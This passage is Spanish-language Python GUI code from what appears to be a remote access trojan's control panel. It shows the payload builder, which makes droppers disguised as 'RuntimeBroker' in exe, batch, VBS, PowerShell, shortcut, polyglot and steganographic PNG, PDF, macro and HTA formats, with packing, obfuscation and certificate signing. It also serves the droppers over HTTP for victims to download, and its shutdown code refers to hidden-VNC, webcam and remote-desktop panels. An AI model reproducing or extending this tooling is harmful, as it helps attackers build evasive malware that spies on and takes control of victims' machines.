        pyarmor = self.chk_pyarmor.isChecked() if hasattr(self, "chk_pyarmor") else False
        try:
            phttp = int(self.in_bhttp.text().strip() or 8080)
        except Exception:
            phttp = 8080
        return Constructor(
            self.in_bhost.text().strip(),
            self.in_bpuerto.text().strip() or self.servidor.puerto,
            log=self._sig_builder.emit,
            nombre=self.in_bnombre.text().strip() or "RuntimeBroker",
            icono=self.in_bicono.text().strip() or None,
            upx=self.in_bupx.text().strip() or None,
            certificado=self.in_bcert.text().strip() or None,
            contrasena_cert=self.in_bpass.text() or None,
            compilador=comp,
            usar_pyarmor=pyarmor,
            puerto_http=phttp)

    def _guardar_config(self):
        try:
            config.guardar(self.in_bhost.text().strip(), self.in_bpuerto.text().strip())
        except Exception:
            pass

    def _detectar_ip_publica(self):
        def worker():
            try:
                import urllib.request
                ip = urllib.request.urlopen("https://api.ipify.org", timeout=6).read().decode().strip()
                self.in_bhost.setText(ip)
                self._sig_builder.emit(f"[builder] IP pública detectada: {ip} "
                                       "(abre el puerto en el router para WAN)")
            except Exception as e:
                self._sig_builder.emit(f"[builder] no pude detectar IP pública: {e}")
        threading.Thread(target=worker, daemon=True).start()

    def _build_todo(self):
        c = self._hacer_constructor()
        self.out_builder.clear()
        self._sig_builder.emit("[builder] generando TODO (droppers + exe ofuscado) ...")

        def worker():
            try:
                c.generar_todo()
                self._sig_builder.emit("[builder] ✓ listo. Recuerda: '🌐 Servir dist' activo.")
            except Exception as e:
                import traceback
                self._sig_builder.emit(f"[builder] ERROR: {e}")
                self._sig_builder.emit(traceback.format_exc())
        threading.Thread(target=worker, daemon=True).start()

    def _build_uno(self, cual):
        c = self._hacer_constructor()
        mapa = {"exe": c.generar_exe, "py": c.generar_py, "bat": c.generar_bat,
                "vbs": c.generar_vbs, "ps1": c.generar_ps1, "lnk": c.generar_lnk,
                "png": c.generar_png_polyglot, "png_stego": c.generar_png_stego,
                "pdf": c.generar_pdf, "macro": c.generar_macro, "hta": c.generar_hta}
        fn = mapa.get(cual)
        if fn is None:
            self._sig_builder.emit(f"[builder] formato desconocido: {cual}")
            return

        def worker():
            try:
                fn()
            except Exception as e:
                import traceback
                self._sig_builder.emit(f"[builder] ERROR: {e}")
                self._sig_builder.emit(traceback.format_exc())
        threading.Thread(target=worker, daemon=True).start()

    def _servir_dist(self):
        c = self._hacer_constructor()

        def worker():
            try:
                c.servir_http(c.puerto_http)
            except Exception as e:
                self._sig_builder.emit(f"[builder] ERROR http: {e}")
        threading.Thread(target=worker, daemon=True).start()
        self._sig_builder.emit(f"[builder] HTTP activo en :{c.puerto_http} (deja la ventana abierta)")

    # ================================================================= cierre
    def closeEvent(self, evento):
        """Nada de procesos hijos ni timers vivos al salir."""
        try:
            self._ping_timer.stop()
        except Exception:
            pass
        if self.panel_wifi is not None:
            try:
                self.panel_wifi.detener()
            except Exception:
                pass
        for lista in (self.escritorios_por_cid, self.hvnc_por_cid,
                      self.webcams_por_cid, self.movil_por_cid):
            for dialogs in lista.values():
                for d in list(dialogs):
                    try:
                        d.close()
                    except Exception:
                        pass
        try:
            self.servidor.detener()
        except Exception:
            pass
        super().closeEvent(evento)